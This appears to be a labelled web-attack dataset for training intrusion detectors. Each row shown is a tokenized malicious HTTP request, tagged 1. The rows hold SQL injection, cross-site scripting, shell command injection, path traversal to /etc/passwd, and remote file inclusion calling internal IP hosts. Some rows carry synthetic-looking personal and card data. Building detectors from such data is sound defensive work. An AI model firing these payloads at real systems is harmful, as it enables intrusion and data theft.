sentences 	 labels
/ 8t9v8k7x . php ?  < script > document . cookie =  " testhvje = 9403 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo hpibfr )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ help . php ? q =  "  ; sleep 8  #  \r\n\r\n 	 1
/ 606wkcop . cfm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = -3104 "  "  union all select 5717 , 5717 , 5717 , 5717 , 5717 , 5717 , 5717 , 5717 , 5717 --  \r\n\r\n 	 1
/ u95h6ymu . kspx ?  < meta http-equiv = set-cookie content =  " testkhwc = 4028 "  >  \r\n\r\n 	 1
/ string / strings / parameters = < script > a =  / xss / nalert (  ' xss '  )  ;  <  / script >  \r\n\r\n 	 1
/ string / modo = insertar & precio = 4639 & b1 = confirmar /  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  and make_set ( 8403 = 8403 , 8899 )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = ; echo svfhgu $  (  ( 48 + 4 )  )  $  ( echo svfhgu ) svfhgu /  /  \r\n\r\n 	 1
/ www / delivery / ac . php ? bannerid = -1331923190 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ywcwjzkf ]  )  )  ; die ;  /  *  \r\n\r\n 	 1
/ string / strings / parameters = "  < svg / onload = confirm ( 0 )  ; prompt ( 0 )  ;  >  "  \r\n\r\n 	 1
/ cgi-bin / index . php ? id = 9_8hm4y9d6 '  \r\n\r\n 	 1
/ psynch / nph-psf . exe ? css = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ jnt3f86c . mscgi ?  < script > document . cookie =  " testcmax = 9270 ;  "  <  / script >  \r\n\r\n 	 1
/ en-us / ddoworrl . kspx ?  < script > document . cookie =  " testvlau = 8517 ;  "  <  / script >  \r\n\r\n 	 1
/ string / id = 3 & nombre = queso + manchego & precio = 39 /  & cantidad = 5 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ help . php ? q =  & rm ; q75765892 & rem ;  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as nbdc where 4444 = 4444 union all select null , null --  \r\n\r\n 	 1
/ string / str =  $  ( echo ixzjdx )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ string / strings / parameters = < svg >  < script xlink : href = data & colon ;  , window . open (  ' https :  /  / www . google . com /  '  )  >  <  / script  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as afnt where 4719 = 4719 and elt ( 8224 = 1275 , 1275 )  --  \r\n\r\n 	 1
/ string / modo = insertar & precio = 9536 & b1 = confirmar '  + and +  ' 1 '  =  ' 1  \r\n\r\n 	 1
/ string / strings / parameters = "  |   [  3 -ne  $  ( echo gzciaw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo rspyhg )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 1
/ help . php ? q =  & ver \ x0b > q84637493 & rem \ x0b  \r\n\r\n 	 1
/ string / strings / parameters = -4542 '  )  )  order by 1 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  ' yzdp '  =  ' yzdp  \r\n\r\n 	 1
/ main . php ? stuff =  '  \ x0arm q31711746  #  \r\n\r\n 	 1
/ nuh3zirz . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ scripts / include / help . php ? base = http :  /  / xxxxxxxx  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  where 5333 = 5333 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  \r\n\r\n 	 1
/ string / strings / parameters = -9659 )  )  )  union all select 8665 , 8665 , 8665 , 8665 , 8665 , 8665 , 8665 --  \r\n\r\n 	 1
/ p043snfr . asp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ recordings / inc / exif . inc . php ? exif_prog =  ( echo -n  ' original_exif_prog_cmd_exec . nasl :   '  ; id )  |  | echo  \r\n\r\n 	 1
/ string / modo = entrar & login = tsong-li0 & pwd = 4om4a1ro173to & remember = on < script > alert (  " paros "  )  ;  <  / script >  & b1 = entrar  \r\n\r\n 	 1
/ rv98iwjp . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 ; waitfor delay  ' 0 : 0 : 5 '  --  thuo  \r\n\r\n 	 1
/ top . php ? stuff =  " rm , q67251581 & rem ,  \r\n\r\n 	 1
/ scripts / fileseek2 . cgi ? foot =  & head =  ; cat  / etc / passwd |  \r\n\r\n 	 1
/ string / strings / parameters = -5755 "  "  or 3581 = 7566  \r\n\r\n 	 1
/ vwmg565s . fts ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as wvvo where 4288 = 4288 ; select  ( case when  ( 5009 = 1133 )  then 5009 else 5009 *  ( select 5009 from information_schema . character_sets )  end )  #  \r\n\r\n 	 1
/ buck_o ' neil /  \r\n\r\n 	 1
/ manager / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ bmeun223 . dll ?  < meta http-equiv = set-cookie content =  " testhhwu = 7044 "  >  \r\n\r\n 	 1
/ string / strings / parameters = "  | echo $ ifsdcxxxg $  (  ( 2 + 46 )  )  $  ( echo $ ifsdcxxxg ) dcxxxg  \r\n\r\n 	 1
/ h5sc3gxy . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / str =  $  ( echo shpkri )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 1
/ vb / includes / functions_cron . php ? nextitem = xxpathxx  \r\n\r\n 	 1
/ string / modo = registro & login = jeri & password = 8n6s17d741a49e & nombre = eutimio & apellidos = zamudio & email = bannen @ masqueclases . ch & dni = 98531799y & direccion = geologo + palacios ,  + 134 ,  + 13 ? b & ciudad = puigverd + de + lleida & cp = 09560 & provincia =  +  & ntc = 3173800761137477 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = '  )  ; waitfor delay ' 0 : 0 : 50 '  ;  --  \r\n\r\n 	 1
/ string / strings / parameters = -1043 "  "  )  where 4207 = 4207 or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = -1337 "  "  )  union all select 7508 --  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ string / strings / parameters = < isindex + type = image + src = 1 + onerror = alert ( 1 )  >  \r\n\r\n 	 1
/ string / strings / parameters = '  or 1 = 1 #  \r\n\r\n 	 1
/ main . php ? logout =  "  & ver & rem \ x0c  \r\n\r\n 	 1
/ phporacleview / inc / include_all . inc . php ? page_dir = xxpathxx ?  \r\n\r\n 	 1
/ main . php ? stuff =  " ping \ xa0-w \ xa010000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  \r\n\r\n 	 1
/  " lindsay lohan "  /  \r\n\r\n 	 1
/ string / modo = registro & login = jarrett & password = ale7a2de8 & nombre = oseas & apellidos = quihuata + cervell & email = rebenciuc @ tiendasyofertas . kz & dni = any ?   set-cookie :  + tamper = 1041264011025374727 & direccion = pisuerga + 132 +  & ciudad = pelayos + de + la + presa & cp = 36658 & provincia = lugo & ntc = 9649891877150082 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = < a href =  "  \ x1cjavascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  \r\n\r\n 	 1
/ phpmyadmin / styles . php ? toroot =  / etc / passwd \ x00  \r\n\r\n 	 1
/ cgi-perl / fileseek2 . cgi ? foot =  & head =  ; cat  / etc / passwd |  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo uivpgt )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ yabbse / sources / packages . php ? sourcedir = xxpathxx  \r\n\r\n 	 1
/ pwcgi / smpwservicescgi . exe ? target = http :  /  / www . nessus . org  \r\n\r\n 	 1
/ top . php ? stuff =  '  ; sleep 10  #  \r\n\r\n 	 1
/ cgi-bin / 20review . asp ? productcode =  '  \r\n\r\n 	 1
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo lvddnf  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ zabbix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  '  /  .  / tmp / ebkkxjvdvd . sh +  >  +  / dev / null +  &  '  )  .  "  ]  = 1  \r\n\r\n 	 1
/ archive . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / ipb5ri ?  ?  \r\n\r\n 	 1
/ cgi . cgi / sensepost . exe ?  / c + dir  \r\n\r\n 	 1
/ top . php ? stuff =  '  \ x0asleep \ x0911 \ x09 #  \r\n\r\n 	 1
/ path_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 96 : 8080 / swgnhpydbq0t ?  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo uftnka )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as njfg where 6392 = 6392 waitfor delay  ' 0 : 0 : 5 '  --  \r\n\r\n 	 1
/ main . php ? stuff =  "  & rm \ x0cq69516617 & rem \ x0c  \r\n\r\n 	 1
/ string / strings / parameters = --  >  <  !  --   -- - >   < img src = xxx : x onerror = javascript : alert ( 1 )  >   --  >  \r\n\r\n 	 1
/ n9xlumt5 . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ cacti / admin / addentry . php ? phpbb_root_path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < svg / onload =  &  # 112 &  # 114 &  # 111 &  # 109 &  # 112 &  # 116 ( 1 )   /  /  cross browser  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo $ ifswywpxy $  (  ( 38 + 95 )  )  $  ( echo $ ifswywpxy ) wywpxy /  /  \r\n\r\n 	 1
/ webdav / phprun . php ? cmd = c :  \ wce . exe -w  \r\n\r\n 	 1
/ string / id = 3 & nombre = jamn '  + ibric- ' o & precio = 39 & cantidad = 22 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ index . php ? query =  < script > alert ( 412005577635 )  <  / script >  & type = advanced & results = 20 & searchtype = 2  \r\n\r\n 	 1
/ ghswfouu . htm ?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >  \r\n\r\n 	 1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo ufbfjz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = |   [  5 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 1
/ string / d =  \  " alert (  ' xss '  )  ;  \  \  "  )  \  "  ;  \r\n\r\n 	 1
/ u8yiqilu . fts ?  < script > document . cookie =  " testswjp = 6010 ;  "  <  / script >  \r\n\r\n 	 1
/ javascript / ofbiz . exe  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 1
/ string / id = 2 & nombre =  +  & precio = 85 & cantidad = 66 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ztqvnm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = |   [  8 -ne  $  ( echo tseufd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  \r\n\r\n 	 1
/ string / strings / parameters = "  " javascript : alert ( 2 )  "  "  >  \r\n\r\n 	 1
/ n9xlumt5 . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ manager / commsrss . php ? files [ 0 ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = '  | echo vquoca $  (  ( 12 + 35 )  )  $  ( echo vquoca ) vquoca '  \r\n\r\n 	 1
/ cgi-bin / fileseek . cgi ? head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & foot =  \r\n\r\n 	 1
/ en-us / 33y9gcqq . html ?  < script > document . cookie =  " testnvxc = 4301 ;  "  <  / script >  \r\n\r\n 	 1
/ examples / jsp / checkbox / main . php ? g2_itemid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / license \ x00  \r\n\r\n 	 1
/ string / strings / parameters = -4947 '  in boolean mode )  union all select 3314 , 3314 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  (  ' zoxm '  like  ' zoxm  \r\n\r\n 	 1
/ recordings / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00  \r\n\r\n 	 1
/ mod . php ? mod = orders & mode = view & sb = 1 & so = a & fb =  & fs =  "  >  < script > alert (  " 411725577544 "  )  ;  <  / script >  <  " 3  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  '  %  '  =  '  \r\n\r\n 	 1
/ string / strings / parameters = 1 ; select  *  \r\n\r\n 	 1
/ webavis / class / class . php ? root = xxpathxx ?  \r\n\r\n 	 1
/ index . php ? configfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / modo = registro & login = lerch & password = 5elas2omat2eo & nombre = alcira & apellidos = forns + kohls & email = busch @ show . nom . naany ?   set-cookie :  + tamper = 1041264011025374727 & dni = 71246547e & direccion = francisco + nio ,  + 100 +  & ciudad = marazoleja & cp = 19144 & provincia = valladolid & ntc = 2373775613776198 & b1 = registrar  \r\n\r\n 	 1
/ string / id = 2any ?  set-cookie :  + tamper = 5765205567234876235  \r\n\r\n 	 1
/ string / strings / parameters = <  / script >  < svg onload =  ' - /  "  / -confirm ( 1 )  /  /  '  \r\n\r\n 	 1
/ manual / images /  ? c = m ; o = a  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  ' snad '  like  ' snad  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo kqszpy )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  \r\n\r\n 	 1
/ i686v90l . html ?  < script > document . cookie =  " testfutf = 1550 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = -6540 '  )  where 5019 = 5019 or  ( 8459 = 8459 )  * 4906 --  \r\n\r\n 	 1
/ sysuser / docmgr / vchist . stm ? path =  < script > alert ( document . cookie )  <  / script >  \r\n\r\n 	 1
/ top . php ? stuff =  ' rm \ x09q39954515 \ x09 #  \r\n\r\n 	 1
/ phpmyadmin /  /  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ javascript / document . war  \r\n\r\n 	 1
/ o35zot2r . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = & echo zjvxwj $  (  ( 77 + 27 )  )  $  ( echo zjvxwj ) zjvxwj "  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  |  |  ( select  ' xhqy '  where 4531 = 4531 union all select null , null --  \r\n\r\n 	 1
/ string / modo = entrar & login = trixi5 & pwd = celcola & remember = offbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo wyaquw )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ string / strings / parameters = echo vryuic $  (  ( 62 + 65 )  )  $  ( echo vryuic ) vryuic /  /  \r\n\r\n 	 1
/ string / modo = registro & login = tarle & password = 8ar0enador & nombre = romildo & apellidos = decaralt + melero & email = nye @ intg . ws & dni = 92321751g & direccion = pl .  + de + la + muralla + liberal + 169 + 2 ? b & ciudada = almensilla & cp = 47513 & provincia = girona & ntc = 9922927157537340 & b1 = registrar  \r\n\r\n 	 1
/ if69ddo1 . htm ?  < script > document . cookie =  " testiabz = 5220 ;  "  <  / script >  \r\n\r\n 	 1
/ t578vqea . kspx ?  < meta http-equiv = set-cookie content =  " testsory = 7676 "  >  \r\n\r\n 	 1
/ string / modo = registro & logina = audy & password = 8a9c27 & nombre = juan & apellidos = ricart + rizzi & email = taube @ farmaoferta . bi & dni = 94839637b & direccion = calle + san + indalencio + 168 +  & ciudad = san + jos + del + valle & cp = 33783 & provincia = zamora & ntc = 8868360012752422 & b1 = registrar  \r\n\r\n 	 1
/ top . php ? stuff =  & ver ,  > q26592279 & rem ,  \r\n\r\n 	 1
/ string / strings / parameters = & lt ; tnn96 & gt ;  \r\n\r\n 	 1
/ hjdzm96v . htm ?  < meta http-equiv = set-cookie content =  " testbyqe = 7474 "  >  \r\n\r\n 	 1
/  .  .  /  { file }  \r\n\r\n 	 1
/ string / strings / parameters = declare  @ s varchar  ( 200 )  select  @ s  =  0x73656c6  .  .  .  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  and elt ( 4249 = 4249 , 7259 )  and  (  (  (  "  " awyk "  "  like  "  " awyk  \r\n\r\n 	 1
/ scripts / modules / tinymce / content_css . php ? templateid = -1 /  *  *  / union /  *  *  / select /  *  *  / 1331919223 , 1 , 390336409 --  \r\n\r\n 	 1
/ qb2xy9aw . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 . 0  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  ' dgvg '  =  ' dgvg  \r\n\r\n 	 1
/ string / strings / parameters = -4346 '  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  \r\n\r\n 	 1
/ examples / jsp / sessions / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < div style = width : 1px ; filter : glow onfilterchange = alert ( 1 )  > x <  / div >  \r\n\r\n 	 1
/ top . php ? stuff =  "  & rm \ xa0q52711668 & rem \ xa0  \r\n\r\n 	 1
/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  "  \ 0174 \ 0044 \ 0000 \ 0377 \ 0347 "   >  >   / tmp / gjehhrjnrx0 ; echo | awstats520569 . txt  \r\n\r\n 	 1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 9 & b1 =  ' injected_param  \r\n\r\n 	 1
/ menu . php3 ? cl_headers = xxpathxx  \r\n\r\n 	 1
/ ghswfouu . exe ?  < script > document . cookie =  " testsqmm = 5713 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  where 1628 = 1628 ; iif ( 9342 = 6508 , 1 , 1 / 0 )  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  --  \r\n\r\n 	 1
/ en-us / w4996nr0 . jspa ?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  \r\n\r\n 	 1
/ string / str =  $  ( echo brbpjx )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 1
/ igtf0zon . cgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ examples / jsp / colors / calendar . php ? serverpath =  / etc / passwd \ x00  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + del + olnb  \r\n\r\n 	 1
/ webcgi / windmail . exe ?  -n c :  \ boot . ini hacker @ hax0r . com  |  dir c :  \  \  \r\n\r\n 	 1
/ d7ktpmcq . htm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ help . php ? q =  & ver \ x0c > q96311231 & rem \ x0c  \r\n\r\n 	 1
/ scripts / shops / sub . asp ? isub = duamazon_sql_injections . nasl '  \r\n\r\n 	 1
/ rv98iwjp . asp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  ,  ( select  ( case when  ( 9443 = 9443 )  then sleep ( 5 )  else 9443 *  ( select 9443 from information_schema . character_sets )  end )  )  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  |  |  ( select  ' ifts '  from dual where 6329 = 6329 ; begin dbms_lock . sleep ( 5 )  ;  end --  \r\n\r\n 	 1
/ string / strings / parameters = $  { shell_exec ( print (  ` echo kiaclj echo  $  (  ( 8 + 79 )  )  echo kiaclj echo kiaclj `  )  ;  .  " kiaclj  \r\n\r\n 	 1
/ string / id = 3 /  & nombre = queso + manchego & precio = 85 & cantidad = 54 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ javascript / thumb . exe  \r\n\r\n 	 1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo stitdi )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ string / strings / parameters = -9653 '  )  where 2705 = 2705 or 9323 = 9323 #  \r\n\r\n 	 1
/ v3axg1p8 . htm ?  < meta http-equiv = set-cookie content =  " testxagh = 6987 "  >  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo ohohht )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  \r\n\r\n 	 1
/ javascript /  ~ john . exe  \r\n\r\n 	 1
/ zv8tv7h8 . htm ?  < meta http-equiv = set-cookie content =  " testcqwz = 9752 "  >  \r\n\r\n 	 1
/ string / modo = entrar & login = kolenda & pwd = 07e1 & remember = off & b1 = entrar ' injected_param  \r\n\r\n 	 1
/ fc9t54l7 . php ?  < meta http-equiv = set-cookie content =  " testggad = 2000 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  \r\n\r\n 	 1
/ main . php ? stuff = ver ;  > q76531174 & rem ;  \r\n\r\n 	 1
/ ybz5rz7a . dll ?  < meta http-equiv = set-cookie content =  " testsbvw = 6289 "  >  \r\n\r\n 	 1
/ string / modo = registro & login = meissner5 & password = 64ua4litar89 & nombre = pandora & apellidos = bustos + oliva & email = defauce @ farma-job . ro & dni = 28677228t & direccion = avenida + heroes + de + baler ,  + 190 ,  +  & ciudad = s . anta /  + cilia & cp = 15984 & provincia = burgos & ntc = 0324680856552215 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  ' mymg '  =  ' mymg  \r\n\r\n 	 1
/ calendario / cal_save . php ? classpath = xxpathxx  \r\n\r\n 	 1
/ string / strings / parameters = '  &  & echo mwtyac $  (  ( 26 + 86 )  )  $  ( echo mwtyac ) mwtyac |  \r\n\r\n 	 1
/ scgi-bin / c32web . exe / changeadminpassword  \r\n\r\n 	 1
/ string / strings / parameters = |   [  3 -ne  $  ( echo mumuqi  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 1
/ classes / auth / openid / dumbstore . php ? _env [ asicms ]  [ path ]  = xxpathxx  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo wvupxi )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ gvx7m5ti . html ?  < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  \r\n\r\n 	 1
/ string / strings / parameters = < style type =  "  " text / css "  "  > body { background : url (  "  " javascript : alert (  ' crosssitescripting '  )  "  "  )  }  <  / style >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
